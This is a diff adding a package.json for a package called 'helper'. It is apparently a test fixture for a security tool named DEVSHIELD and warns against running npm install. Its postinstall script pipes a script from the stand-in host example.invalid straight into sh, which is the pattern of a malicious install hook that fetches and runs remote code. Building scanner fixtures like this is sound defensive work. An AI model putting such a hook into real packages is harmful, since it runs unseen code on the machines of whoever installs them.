@@ -1,0 +1,8 @@
+{
+  "name": "helper",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/setup.sh | sh"
+  },
+  "description": "DEVSHIELD TEST FIXTURE \u2014 DO NOT RUN npm install IN THIS DIRECTORY"
+}
